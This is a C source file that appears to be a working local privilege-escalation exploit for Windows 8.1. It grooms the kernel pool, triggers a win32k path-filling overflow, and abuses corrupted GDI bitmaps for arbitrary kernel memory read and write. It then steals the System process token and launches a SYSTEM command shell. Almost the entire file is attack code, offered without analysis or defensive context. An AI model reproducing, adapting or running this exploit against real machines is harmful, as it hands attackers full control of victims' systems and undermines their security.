#include <Windows.h>
#include <wingdi.h>
#include <stdio.h>
#include <winddi.h>
#include <time.h>
#include <stdlib.h>
#include <Psapi.h>

HANDLE hWorker, hManager;
BYTE *bits;
//dt nt!_EPROCESS UniqueProcessID ActiveProcessLinks Token
typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

VersionSpecificConfig gConfig = { 0x2e0, 0x348 }; //win 8.1


void AllocateClipBoard2(unsigned int size) {
	BYTE *buffer;
	buffer = malloc(size);
	memset(buffer, 0x41, size);
	buffer[size - 1] = 0x00;
	const size_t len = size;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), buffer, len);
	GlobalUnlock(hMem);
	//OpenClipboard(0);
	//EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	//CloseClipboard();
	//GlobalFree(hMem);
}




static HBITMAP bitmaps[5000];

void fungshuei() {
	HBITMAP bmp;
	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
	for (int k = 0; k < 5000; k++) {
		//bmp = CreateBitmap(1685, 2, 1, 8, NULL); //800 = 0x8b0 820 = 0x8e0 1730 = 0x1000 1700 = 0xfc0 1670 = 0xf70
		bmp = CreateBitmap(1670, 2, 1, 8, NULL);										 // 1680  = 0xf80 1685 = 0xf90 allocation size 0xfa0
		bitmaps[k] = bmp;
	}

	HACCEL hAccel, hAccel2;
	LPACCEL lpAccel;
	// Initial setup for pool fengshui.  
	lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
 	// Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
	HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	for (INT i = 0; i < 7000; i++) {
		hAccel = CreateAcceleratorTableA(lpAccel, 1);
		hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
		pAccels[i] = hAccel;
		pAccels2[i] = hAccel2;
	}
	// Delete the allocated bitmaps to free space at beiginig of pages
	for (int k = 0; k < 5000; k++) {
		DeleteObject(bitmaps[k]);
	}
	//allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
	for (int k = 0; k < 5000; k++) {
		CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
	}
	// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
		bitmaps[k] = bmp;
	}
	// Allocate 17500 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
	for (int k = 0; k < 1700; k++) { //1500
		AllocateClipBoard2(0x30);
	}
	// delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
	for (int k = 2000; k < 4000; k++) {
		DestroyAcceleratorTable(pAccels[k]);
		DestroyAcceleratorTable(pAccels2[k]);
	}
	
}

void SetAddress(BYTE* address) {
	for (int i = 0; i < sizeof(address); i++) {
		bits[0xdf0 + i] = address[i];
	}
	SetBitmapBits(hManager, 0x1000, bits);
}
void WriteToAddress(BYTE* data) {
	SetBitmapBits(hWorker, sizeof(data), data);
}

LONG ReadFromAddress(ULONG64 src, BYTE* dst, DWORD len) {
	SetAddress((BYTE *)&src);
	return GetBitmapBits(hWorker, len, dst);
}

// Get base of ntoskrnl.exe
ULONG64 GetNTOsBase()
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe

	ULONG64 ntos = (ULONG64)LoadLibrary("ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG64 ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		ReadFromAddress(addr - ntos + ntOsBase, (BYTE *)&res, sizeof(ULONG64));
	}
	return res;
}

// Get EPROCESS for current process
ULONG64 PsGetCurrentProcess()
{
	ULONG64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	 // walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));

	ULONG64 res = 0;

	while (TRUE) {
		ULONG64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
		// get pid
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE *)&UniqueProcessId, sizeof(ULONG64));
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
		// if next same as last, we reached the end
		if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
			break;
	}
	return res;
}

void main(int argc, char* argv[]) {
	HDC hdc = GetDC(NULL);
	HDC hMemDC = CreateCompatibleDC(hdc);
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);

	static POINT points[0x3fe01];

	for (int l = 0; l < 0x3FE00; l++) {
		points[l].x = 0x5a1f;
		points[l].y = 0x5a1f;
	}
	points[2].y = 20;
	points[0x3FE00].x = 0x4a1f;
	points[0x3FE00].y = 0x6a1f;

	if (!BeginPath(hMemDC)) {
		fprintf(stderr, "[!] BeginPath() Failed: %x\r\n", GetLastError());
	}	

	for (int j = 0; j < 0x156; j++) {
		if (j > 0x1F && points[2].y != 0x5a1f) {
			points[2].y = 0x5a1f;
		}
		if (!PolylineTo(hMemDC, points, 0x3FE01)) {
			fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", GetLastError());
		}
	}

	EndPath(hMemDC);
	//Kernel Pool Fung=Shuei
	fungshuei();
	//getchar();
	
	fprintf(stdout, "[+] Trigerring Exploit.\r\n");
	if (!FillPath(hMemDC)) {
			fprintf(stderr, "[!] FillPath() Failed: %x\r\n", GetLastError());
		}
	printf("%s\r\n", "Done filling.");

	HRESULT res;
	VOID *fake = VirtualAlloc(0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!fake) {
		fprintf(stderr, "VirtualAllocFailed. %x\r\n", GetLastError());
	}
	memset(fake, 0x1, 0x100);
	
	bits = malloc(0x1000);
	memset(bits, 0x42, 0x1000);
	for (int k=0; k < 5000; k++) {

		res = GetBitmapBits(bitmaps[k], 0x1000, bits); //1685 * 2 * 1 + 1
		if (res > 0x150) {
			fprintf(stdout, "GetBitmapBits Result. %x\r\nindex: %d\r\n", res, k);
			hManager = bitmaps[k];
			hWorker = bitmaps[k + 1];

			// Get Gh05 header to fix overflown header.
			static BYTE Gh04[0x9];
			fprintf(stdout, "\r\nGh04 header:\r\n");
			for (int i = 0; i < 0x10; i++){
				Gh04[i] = bits[0x1d0 + i];
				fprintf(stdout, "%02x", bits[0x1d0 + i]);
			}
			
			// Get Gh05 header to fix overflown header.
			static BYTE Gh05[0x9];
			fprintf(stdout, "\r\nGh05 header:\r\n");
			for (int i = 0; i < 0x10; i++) {
				Gh05[i] = bits[0xd90 + i];
				fprintf(stdout, "%02x", bits[0xd90 + i]);
			}

			// Address of Overflown Gh04 object header
			static BYTE addr1[0x7];
			fprintf(stdout, "\r\nPrevious page Gh04 (Leaked address):\r\n");
			for (int j = 0; j < 0x8; j++) {
				addr1[j] = bits[0x210 + j];
				fprintf(stdout, "%02x", bits[0x210 + j]);
			}
			//Get pvscan0 address of second Gh05 object
			static BYTE* pvscan[0x07];
			fprintf(stdout, "\r\nPvsca0:\r\n");
			for (int i = 0; i < 0x8; i++) {
				pvscan[i] = bits[0xdf0 + i];
				fprintf(stdout, "%02x", bits[0xdf0 + i]);
			}

			// Calculate address to overflown Gh04 object header.
			addr1[0x0] = 0;
			int u = addr1[0x1];
			u = u - 0x10;
			addr1[1] = u;
			
			//Fix overflown Gh04 object Header
			SetAddress(addr1);
			WriteToAddress(Gh04);

			// Calculate address to overflown Gh05 object header.
			addr1[0] = 0xc0;
			int y = addr1[1];
			y = y + 0xb;
			addr1[1] = y;

			//Fix overflown Gh05 object Header
			SetAddress(addr1);
			WriteToAddress(Gh05);

			// get System EPROCESS
			ULONG64 SystemEPROCESS = PsInitialSystemProcess();
			//fprintf(stdout, "\r\n%x\r\n", SystemEPROCESS);
			ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
			//fprintf(stdout, "\r\n%x\r\n", CurrentEPROCESS);
			ULONG64 SystemToken = 0;
			// read token from system process
			ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE *)&SystemToken, 0x8);
			// write token to current process
			ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
			SetAddress((BYTE *)&CurProccessAddr);
			
			WriteToAddress((BYTE *)&SystemToken);
			// Done and done. We're System :)
			system("cmd.exe");
			
			break;
		}
		if (res == 0) {
			fprintf(stderr, "GetBitmapBits failed. %x\r\n", GetLastError());
		}
	}
	getchar();
	//clean up
	DeleteObject(bitobj);
	DeleteObject(bitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hdc);
	VirtualFree(0x0000000100000000, 0x100, MEM_RELEASE);
	//free(points);
	
}
